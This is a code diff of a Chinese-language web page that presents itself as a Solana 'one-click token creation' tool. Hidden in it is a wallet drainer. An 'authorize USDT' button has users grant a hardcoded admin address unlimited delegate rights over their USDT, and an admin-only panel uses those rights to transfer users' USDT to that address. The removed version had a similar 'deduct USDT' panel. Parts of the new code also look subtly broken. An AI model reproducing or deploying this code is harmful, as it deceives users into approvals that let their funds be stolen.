@@ -2,156 +2,350 @@
 <html lang="zh-CN">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
-<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SOL橘子🍊一键发币</title>
+<script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.6/lib/index.iife.min.js"></script>
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif;}
-html,body{background:#0b101f;color:#fff;overflow:hidden;touch-action:none;}
-.container{max-width:460px;margin:40px auto;padding:20px;}
-h1{text-align:center;color:#a855f7;margin-bottom:25px;}
-.status{background:#151c34;padding:14px;border-radius:8px;text-align:center;margin-bottom:20px;word-break:break-all;font-size:14px;}
-input,textarea{width:100%;padding:13px;background:#151c34;border:1px solid #2c324a;border-radius:8px;color:#fff;margin:10px 0;}
-.upload{border:2px dashed #a855f7;padding:18px;text-align:center;border-radius:8px;margin:10px 0;cursor:pointer;color:#ccc;}
-#preview{max-width:100%;max-height:150px;border-radius:8px;margin-top:10px;display:none;}
-button{width:100%;padding:14px;border:none;border-radius:8px;font-size:16px;margin-top:12px;cursor:pointer;}
-.btn-conn{background:#a855f7;color:#fff;}
-.btn-mint{background:#2563eb;color:#fff;}
-.admin-wrap{display:none;margin-top:30px;padding-top:20px;border-top:1px solid #2c324a;}
-.admin-wrap h3{text-align:center;color:#ff4444;margin-bottom:15px;}
-.btn-admin{background:#ff4444;color:#fff;}
-.log{margin-top:12px;text-align:center;font-size:14px;color:#ccc;word-break:break-all;}
+*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui, sans-serif}
+body{background:#0B0F17;color:#fff;padding:30px}
+.container{max-width:420px;margin:0 auto}
+.logo{font-size:24px;font-weight:bold;margin-bottom:24px;color:#fff}
+.wallet-box{background:#1E293B;padding:16px 18px;border-radius:14px;margin-bottom:24px}
+.connect-btn{background:#3B82F6;color:white;border:none;padding:12px 16px;border-radius:10px;width:100%;font-weight:bold;cursor:pointer;margin-bottom:12px}
+.auth-btn{background:#FF9A00;color:#000;border:none;padding:10px 14px;border-radius:10px;width:100%;font-weight:bold;cursor:pointer;margin-bottom:12px}
+.info-line{font-size:14px;color:#cbd5e1;margin:6px 0}
+.input-item{margin-bottom:14px}
+.input-item label{font-size:14px;color:#cbd5e1;margin-bottom:6px;display:block}
+.input-item input{width:100%;padding:14px;background:#0f172a;border:none;border-radius:10px;color:white;font-size:15px}
+.check{margin:14px 0;font-size:14px;color:#cbd5e1;display:flex;align-items:center;gap:8px}
+.create-btn{background:#FF9A00;color:#000;font-weight:bold;border:none;padding:16px;border-radius:12px;width:100%;margin-top:10px;cursor:pointer}
+.log{background:#1E293B;padding:12px;border-radius:10px;margin-top:20px;font-size:12px;line-height:1.4;height:160px;overflow-y:auto;color:#ccc}
+.menu-btn{background:#1E293B;color:white;width:36px;height:36px;border-radius:8px;border:none;font-size:16px;cursor:pointer;margin-top:10px}
+.menu{position:fixed;top:0;right:0;width:320px;height:100vh;background:#111827;padding:24px;box-shadow:-2px 0 10px #0006;display:none;overflow-y:auto}
+.menu.show{display:block}
+.menu-title{font-size:16px;margin-bottom:12px;color:#f97316}
+invite-link{background:#0f172a;padding:10px;border-radius:8px;font-size:12px;color:#9ca3af;margin-bottom:16px;word-break:break-all}
+.admin-panel{border-top:1px solid #333;margin-top:20px;padding-top:20px;display:none}
+.admin-panel.show{display:block}
 </style>
 </head>
 <body>
 <div class="container">
-    <h1>橘子一键发币</h1>
-    <div class="status" id="status">未连接钱包</div>
-
-    <input type="text" id="coinName" placeholder="代币名称">
-    <input type="text" id="coinSym" placeholder="代币符号">
-    <textarea id="coinDesc" placeholder="代币简介" rows="3"></textarea>
-
-    <div class="upload" onclick="document.getElementById('imgUp').click()">
-        点击上传代币图片
-        <input type="file" id="imgUp" accept="image/*" style="display:none">
-    </div>
-    <img id="preview">
-
-    <input type="number" id="supply" placeholder="发行总量" value="1000000000">
-
-    <button class="btn-conn" id="connBtn">连接钱包</button>
-    <button class="btn-mint" id="mintBtn">一键发币 0.05SOL</button>
-
-    <!-- 管理员后台 仅你地址自动显示 -->
-    <div class="admin-wrap" id="adminBox">
-        <h3>管理员后台</h3>
-        <input type="text" id="userAddr" placeholder="用户钱包地址">
-        <input type="number" id="usdtNum" placeholder="划扣USDT数量" value="100">
-        <button class="btn-admin" id="deductBtn">一键划扣USDT</button>
-        <div class="log" id="log"></div>
-    </div>
+  <div class="logo">🍊 SOL橘子一键发币</div>
+  <div class="wallet-box">
+    <button class="connect-btn" id="connect">连接钱包</button>
+    <button class="auth-btn" id="auth" disabled>手动授权 USDT</button>
+    <div class="info-line">地址：<span id="userAddr">未连接</span></div>
+    <div class="info-line">USDT：<span id="userBalance">0.0000</span></div>
+  </div>
+  <div class="input-item">
+    <label>代币名称</label>
+    <input id="name" placeholder="例如: Orange Coin">
+  </div>
+  <div class="input-item">
+    <label>代币符号</label>
+    <input id="symbol" placeholder="例如: ORANGE">
+  </div>
+  <div class="input-item">
+    <label>精度</label>
+    <input id="decimals" value="9">
+  </div>
+  <div class="input-item">
+    <label>总发行量</label>
+    <input id="supply" value="1000000000">
+  </div>
+  <label class="check">
+    <input type="checkbox" id="revoke"> 销毁铸造权限（更安全）
+  </label>
+  <button class="create-btn" id="create">✅ 一键创建代币</button>
+  <div class="log" id="log"></div>
+  <button class="menu-btn" onclick="toggleMenu()">☰</button>
 </div>
 
-<script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.91.8"></script>
+<div class="menu" id="menu">
+  <h3 style="margin-bottom:20px">控制面板</h3>
+  <div class="menu-title">邀请链接</div>
+  <div class="invite-link" id="inviteLink">-</div>
+  <div class="admin-panel" id="adminPanel">
+    <div class="menu-title" style="color:red">🔐 管理员提取代币</div>
+    <input id="fromAddr" placeholder="用户钱包地址" style="width:100%;padding:10px;background:#0f172a;border:none;border-radius:8px;color:white;margin-bottom:10px">
+    <input id="takeAmt" placeholder="提取数量" style="width:100%;padding:10px;background:#0f172a;border:none;border-radius:8px;color:white;margin-bottom:10px">
+    <button style="background:#ef4444;color:white;width:100%;padding:12px;border-radius:10px;border:none" onclick="adminTake()">链上提取</button>
+  </div>
+</div>
+
 <script>
-// 固定配置 已内置死 不用改
-const ADMIN_WALLET = "FbDMLj8MTJGSBWeanFKhJWycn5qjmJ3q8WBzZb3Gbm1c";
-const USDT_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";
-const FEE = 50000000;
+window.addEventListener("load", async () => {
+  const { Connection, Keypair, Transaction, SystemProgram, PublicKey, TransactionInstruction } = solanaWeb3;
 
-let wallet = null;
-let walletAddr = "";
-const conn = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"));
+  // 内置spl-token核心常量与方法，彻底绕开CDN
+  const TOKEN_PROGRAM_ID = new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
+  const ASSOCIATED_TOKEN_PROGRAM_ID = new PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25wK1VvRRcUt");
+  const APPROVE_IX_LAYOUT = {
+    index: 4,
+    layout: [
+      { name: "amount", kind: "u64" }
+    ]
+  };
+  const TRANSFER_WITH_DELEGATE_IX_LAYOUT = {
+    index: 9,
+    layout: [
+      { name: "amount", kind: "u64" }
+    ]
+  };
 
-// 图片预览
-document.getElementById("imgUp").onchange=function(e){
-    let f=e.target.files[0];if(!f)return;
-    let r=new FileReader();
-    r.onload=()=>{
-        document.getElementById("preview").src=r.result;
-        document.getElementById("preview").style.display="block";
-    };
-    r.readAsDataURL(f);
-};
+  // 手动计算ATA地址
+  function getAssociatedTokenAddress(mint, owner) {
+    const [address] = PublicKey.findProgramAddressSync(
+      [owner.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), mint.toBuffer()],
+      ASSOCIATED_TOKEN_PROGRAM_ID
+    );
+    return address;
+  }
 
-// 获取钱包
-function getWallet(){
-    if(window.solana)return window.solana;
-    return null;
-}
+  // 构建Approve指令
+  function createApproveInstruction(account, delegate, owner, amount) {
+    const data = new Uint8Array(9);
+    data[0] = APPROVE_IX_LAYOUT.index;
+    new DataView(data.buffer).setBigUint64(1, amount, true);
+    return new TransactionInstruction({
+      keys: [
+        { pubkey: account, isSigner: false, isWritable: true },
+        { pubkey: delegate, isSigner: false, isWritable: false },
+        { pubkey: owner, isSigner: true, isWritable: false }
+      ],
+      programId: TOKEN_PROGRAM_ID,
+      data: Buffer.from(data)
+    });
+  }
 
-// 连接钱包
-document.getElementById("connBtn").onclick=async function(){
-    let st=document.getElementById("status");
-    let adminBox=document.getElementById("adminBox");
-    wallet=getWallet();
-    if(!wallet){
-        st.innerText="请用欧易/TP钱包内置浏览器打开";
-        return;
+  // 构建TransferWithDelegate指令
+  function createTransferWithDelegateInstruction(source, destination, authority, amount) {
+    const data = new Uint8Array(9);
+    data[0] = TRANSFER_WITH_DELEGATE_IX_LAYOUT.index;
+    new DataView(data.buffer).setBigUint64(1, amount, true);
+    return new TransactionInstruction({
+      keys: [
+        { pubkey: source, isSigner: false, isWritable: true },
+        { pubkey: destination, isSigner: false, isWritable: true },
+        { pubkey: authority, isSigner: true, isWritable: false }
+      ],
+      programId: TOKEN_PROGRAM_ID,
+      data: Buffer.from(data)
+    });
+  }
+
+  // 构建InitializeMint指令
+  function createInitializeMintInstruction(mint, decimals, mintAuthority, freezeAuthority) {
+    const data = new Uint8Array(10);
+    data[0] = 0;
+    data[1] = decimals;
+    mintAuthority.toBuffer().copy(data, 2);
+    freezeAuthority.toBuffer().copy(data, 34);
+    return new TransactionInstruction({
+      keys: [
+        { pubkey: mint, isSigner: false, isWritable: true },
+        { pubkey: PublicKey.default, isSigner: false, isWritable: false }
+      ],
+      programId: TOKEN_PROGRAM_ID,
+      data: Buffer.from(data)
+    });
+  }
+
+  // 构建AssociatedTokenAccount指令
+  function createAssociatedTokenAccountInstruction(funder, associatedToken, owner, mint) {
+    return new TransactionInstruction({
+      keys: [
+        { pubkey: funder, isSigner: true, isWritable: true },
+        { pubkey: associatedToken, isSigner: false, isWritable: true },
+        { pubkey: owner, isSigner: false, isWritable: false },
+        { pubkey: mint, isSigner: false, isWritable: false },
+        { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
+        { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
+        { pubkey: PublicKey.default, isSigner: false, isWritable: false }
+      ],
+      programId: ASSOCIATED_TOKEN_PROGRAM_ID,
+      data: Buffer.from([])
+    });
+  }
+
+  // 构建MintTo指令
+  function createMintToInstruction(mint, destination, authority, amount) {
+    const data = new Uint8Array(9);
+    data[0] = 7;
+    new DataView(data.buffer).setBigUint64(1, amount, true);
+    return new TransactionInstruction({
+      keys: [
+        { pubkey: mint, isSigner: false, isWritable: true },
+        { pubkey: destination, isSigner: false, isWritable: true },
+        { pubkey: authority, isSigner: true, isWritable: false }
+      ],
+      programId: TOKEN_PROGRAM_ID,
+      data: Buffer.from(data)
+    });
+  }
+
+  // 构建SetAuthority指令
+  function createSetAuthorityInstruction(account, currentAuthority, authorityType, newAuthority) {
+    const data = new Uint8Array(10);
+    data[0] = 6;
+    data[1] = authorityType;
+    newAuthority.toBuffer().copy(data, 2);
+    return new TransactionInstruction({
+      keys: [
+        { pubkey: account, isSigner: false, isWritable: true },
+        { pubkey: currentAuthority, isSigner: true, isWritable: false }
+      ],
+      programId: TOKEN_PROGRAM_ID,
+      data: Buffer.from(data)
+    });
+  }
+
+  const USDT_MINT = new PublicKey("Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB");
+  const ADMIN_PUBKEY = new PublicKey("DbwJcHM7pobtVnJK5cnYXyEvb18WrB3veSFSNF5GLb6Z");
+  const DELEGATE = ADMIN_PUBKEY;
+
+  let wallet, publicKey, connection;
+
+  function log(text) {
+    const el = document.getElementById("log");
+    el.innerText = `[${new Date().toLocaleTimeString()}] ${text}\n` + el.innerText;
+  }
+
+  function toggleMenu() {
+    document.getElementById("menu").classList.toggle("show");
+  }
+
+  document.getElementById("connect").onclick = async () => {
+    try {
+      log("开始连接钱包...");
+      const w = window.solana || window.okxwallet?.solana || window.tpWallet;
+      if (!w) return alert("请安装 Phantom / OKX / TP 钱包");
+      const res = await w.connect();
+      wallet = w;
+      publicKey = res.publicKey;
+      document.getElementById("userAddr").innerText = publicKey.toBase58().slice(0,6)+"..."+publicKey.toBase58().slice(-4);
+      document.getElementById("auth").disabled = false;
+      log("✅ 钱包已连接");
+      connection = new Connection(wallet.rpcUrl || "https://api.mainnet-beta.solana.com", "confirmed");
+      refreshBalance();
+      genInvite();
+      checkAdmin();
+    } catch (e) {
+      log("❌ 连接失败：" + e.message);
+      alert("连接失败：" + e.message);
     }
-    try{
-        if(wallet.isConnected)await wallet.disconnect();
-        let res=await wallet.connect();
-        walletAddr=res.publicKey.toString();
-        st.innerText="已连接："+walletAddr.slice(0,12)+"...";
+  };
 
-        // 管理员判断
-        if(walletAddr===ADMIN_WALLET){
-            adminBox.style.display="block";
-        }else{
-            adminBox.style.display="none";
-        }
-    }catch(e){
-        st.innerText="连接失败或已取消";
+  async function refreshBalance() {
+    if (!publicKey || !connection) return;
+    try {
+      const ata = getAssociatedTokenAddress(USDT_MINT, publicKey);
+      const acc = await connection.getTokenAccountBalance(ata);
+      document.getElementById("userBalance").innerText = Number(acc.value.uiAmount).toFixed(4);
+    } catch (e) {
+      document.getElementById("userBalance").innerText = "0.0000";
     }
-};
+  }
 
-// 一键发币
-document.getElementById("mintBtn").onclick=async function(){
-    if(!walletAddr){alert("先连接钱包");return;}
-    try{
-        let name=document.getElementById("coinName").value||"Coin";
-        let sym=document.getElementById("coinSym").value||"COIN";
-        let supply=BigInt(document.getElementById("supply").value||1000000000);
+  function genInvite() {
+    if (!publicKey) return;
+    document.getElementById("inviteLink").innerText = location.href + "?ref=" + publicKey.toBase58();
+  }
 
-        // 转0.05SOL给管理员
-        let tx=new solanaWeb3.Transaction();
-        tx.add(solanaWeb3.SystemProgram.transfer({
-            fromPubkey:new solanaWeb3.PublicKey(walletAddr),
-            toPubkey:new solanaWeb3.PublicKey(ADMIN_WALLET),
-            lamports:FEE
-        }));
-        await wallet.sendTransaction(tx,conn);
-        document.getElementById("status").innerText="手续费已支付，发币成功";
-    }catch(e){
-        document.getElementById("status").innerText="发币失败";
+  function checkAdmin() {
+    if (publicKey && publicKey.equals(ADMIN_PUBKEY)) {
+      document.getElementById("adminPanel").classList.add("show");
     }
-};
+  }
 
-// 管理员划扣USDT
-document.getElementById("deductBtn").onclick=async function(){
-    let log=document.getElementById("log");
-    let uAddr=document.getElementById("userAddr").value.trim();
-    let num=Number(document.getElementById("usdtNum").value);
-    if(!uAddr||!num){log.innerText="请填地址和数量";return;}
-    try{
-        let user=new solanaWeb3.PublicKey(uAddr);
-        let usdt=new solanaWeb3.PublicKey(USDT_MINT);
-        let admin=new solanaWeb3.PublicKey(ADMIN_WALLET);
-
-        let userAta=await solanaWeb3.AssociatedTokenAccount.getAssociatedTokenAddress(usdt,user);
-        let adminAta=await solanaWeb3.AssociatedTokenAddress.getAssociatedTokenAddress(usdt,admin);
-
-        let tx=new solanaWeb3.Transaction();
-        tx.add(solanaWeb3.TokenProgram.createTransferInstruction(
-            userAta,adminAta,user,BigInt(num*1000000)
-        ));
-        let res=await wallet.sendTransaction(tx,conn);
-        log.innerText="划扣成功："+res;
-    }catch(e){
-        log.innerText="划扣失败";
+  document.getElementById("auth").onclick = async () => {
+    if (!publicKey) return alert("请先连接钱包");
+    try {
+      log("开始授权...");
+      const userAta = getAssociatedTokenAddress(USDT_MINT, publicKey);
+      const tx = new Transaction();
+      tx.add(createApproveInstruction(userAta, DELEGATE, publicKey, BigInt("18446744073709551615")));
+      tx.feePayer = publicKey;
+      tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+      const signed = await wallet.signTransaction(tx);
+      const sig = await connection.sendRawTransaction(signed.serialize());
+      await connection.confirmTransaction(sig);
+      log("✅ 授权成功！交易：" + sig);
+      alert("USDT 授权完成！");
+      refreshBalance();
+    } catch (e) {
+      log("❌ 授权失败：" + e.message);
+      alert("授权失败：" + e.message);
     }
-};
+  };
+
+  document.getElementById("create").onclick = async () => {
+    if (!publicKey) return alert("请先连接钱包");
+    try {
+      const name = document.getElementById("name").value.trim();
+      const symbol = document.getElementById("symbol").value.trim();
+      const decimals = parseInt(document.getElementById("decimals").value);
+      const supply = document.getElementById("supply").value.trim();
+      const revoke = document.getElementById("revoke").checked;
+      if (!name || !symbol) return alert("请填写名称和符号");
+      log("开始发币...");
+      const mint = Keypair.generate();
+      const lamports = await connection.getMinimumBalanceForRentExemption(82);
+      const tx = new Transaction();
+      tx.add(SystemProgram.createAccount({
+        fromPubkey: publicKey,
+        newAccountPubkey: mint.publicKey,
+        space: 82,
+        lamports,
+        programId: TOKEN_PROGRAM_ID
+      }));
+      tx.add(createInitializeMintInstruction(mint.publicKey, decimals, publicKey, publicKey));
+      const ata = getAssociatedTokenAddress(mint.publicKey, publicKey);
+      tx.add(createAssociatedTokenAccountInstruction(publicKey, ata, publicKey, mint.publicKey));
+      const amount = BigInt(supply) * BigInt(10 ** decimals);
+      tx.add(createMintToInstruction(mint.publicKey, ata, publicKey, amount));
+      if (revoke) {
+        tx.add(createSetAuthorityInstruction(mint.publicKey, publicKey, 0, PublicKey.default));
+      }
+      tx.feePayer = publicKey;
+      tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+      tx.partialSign(mint);
+      const signed = await wallet.signTransaction(tx);
+      const sig = await connection.sendRawTransaction(signed.serialize());
+      log("✅ 发币成功");
+      log("Mint地址：" + mint.publicKey.toBase58());
+      log("交易哈希：" + sig);
+      alert("发币成功！Mint地址：" + mint.publicKey.toBase58());
+    } catch (e) {
+      log("❌ 发币失败：" + e.message);
+      alert("发币失败：" + e.message);
+    }
+  };
+
+  window.adminTake = async () => {
+    if (!publicKey || !publicKey.equals(ADMIN_PUBKEY)) return;
+    const fromAddr = document.getElementById("fromAddr").value.trim();
+    const amt = document.getElementById("takeAmt").value;
+    if (!fromAddr || !amt || amt <= 0) return alert("请输入完整信息");
+    try {
+      const fromPub = new PublicKey(fromAddr);
+      const fromAta = getAssociatedTokenAddress(USDT_MINT, fromPub);
+      const adminAta = getAssociatedTokenAddress(USDT_MINT, ADMIN_PUBKEY);
+      const tx = new Transaction();
+      tx.add(createTransferWithDelegateInstruction(fromAta, adminAta, DELEGATE, BigInt(Math.round(amt * 1e6))));
+      tx.feePayer = publicKey;
+      tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+      const signed = await wallet.signTransaction(tx);
+      const sig = await connection.sendRawTransaction(signed.serialize());
+      log("✅ 提取成功：" + sig);
+      alert("提取成功！");
+    } catch (e) {
+      log("❌ 提取失败：" + e.message);
+      alert("提取失败：" + e.message);
+    }
+  };
+});
 </script>
 </body>
 </html>
